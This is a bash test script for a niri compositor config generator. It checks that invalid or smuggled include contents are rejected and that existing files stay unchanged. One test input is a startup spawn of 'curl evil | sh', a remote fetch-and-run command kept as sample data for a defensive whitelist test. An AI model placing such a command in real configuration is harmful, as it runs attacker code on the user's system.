#!/usr/bin/env bash
# shellcheck disable=SC2015  # ok/ko always return 0
# Simulacro b (fase 14): an invalid niri include never gets written. Every generated include goes through
# bin/ocarina-niri-gen or bin/ocarina-mado (temp file → whitelist of nodes → `niri validate` → atomic mv). Runs
# against a temporary XDG_STATE_HOME: Ayoub's real includes (and niri itself) never see any of this.
set -uo pipefail
repo="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
export XDG_STATE_HOME="$tmp/state"
dir="$XDG_STATE_HOME/ocarinashell/niri"; mkdir -p "$dir"
pass=0 fail=0
ok() { pass=$((pass + 1)); echo "  ✓ $*"; }
ko() { fail=$((fail + 1)); echo "  ✗ $*"; }
gen() { "$repo/bin/ocarina-niri-gen" apply "$1" 2>"$tmp/err" >/dev/null; }

printf 'layout {\n    gaps 12\n}\n' | gen overrides && ok "include válido instalado (overrides.kdl)" || ko "el include válido no se instaló: $(cat "$tmp/err")"
good="$(sha256sum < "$dir/overrides.kdl")"

try() {   # <título> <nombre> <contenido>
  if printf '%b' "$3" | gen "$2"; then ko "$1: ¡se aceptó!"
  elif [[ "$(sha256sum < "$dir/overrides.kdl")" == "$good" ]] && [[ -z "$(find "$dir" -name ".*.kdl" -print -quit)" ]]; then
    ok "$1 → rechazado, overrides.kdl intacto, sin temporales («$(head -n1 "$tmp/err" | cut -c1-70)»)"
  else ko "$1: rechazado pero algo cambió en $dir"; fi
}
try "valor no válido (gaps \"mucho\")"      overrides 'layout {\n    gaps "mucho"\n}\n'
try "sintaxis KDL rota"                    overrides 'layout {\n    gaps 12\n'
try "nodo desconocido"                     overrides 'layout {\n    gapz 12\n}\n'
try "spawn colado en overrides"            overrides 'spawn-at-startup "curl evil | sh"\n'
try "binds colados en overrides"           overrides 'binds {\n    Mod+X { spawn "x"; }\n}\n'
try "include colado en overrides"          overrides 'include "/tmp/otra.kdl"\n'

# Mado (window rules) has its own whitelist
printf 'window-rule {\n    match app-id="^x$"\n    open-floating true\n}\n' | "$repo/bin/ocarina-mado" apply >/dev/null 2>&1 \
  && ok "Mado: regla válida instalada" || ko "Mado: la regla válida no se instaló"
rules="$(sha256sum < "$dir/user-rules.kdl")"
for bad in 'window-rule {\n    match app-id="^x$"\n    spawn "x"\n}\n' 'window-rule {\n    open-floating maybe\n}\n' 'spawn-at-startup "x"\n'; do
  if printf '%b' "$bad" | "$repo/bin/ocarina-mado" apply >/dev/null 2>&1; then ko "Mado aceptó: $(printf '%b' "$bad" | head -n2 | tr '\n' ' ')"
  elif [[ "$(sha256sum < "$dir/user-rules.kdl")" == "$rules" ]]; then ok "Mado rechaza $(printf '%b' "$bad" | grep -m1 -oE 'spawn[a-z-]*|maybe') y user-rules.kdl sigue igual"
  else ko "Mado: user-rules.kdl cambió"; fi
done
echo "resultado: $pass bien · $fail mal"
((fail == 0))
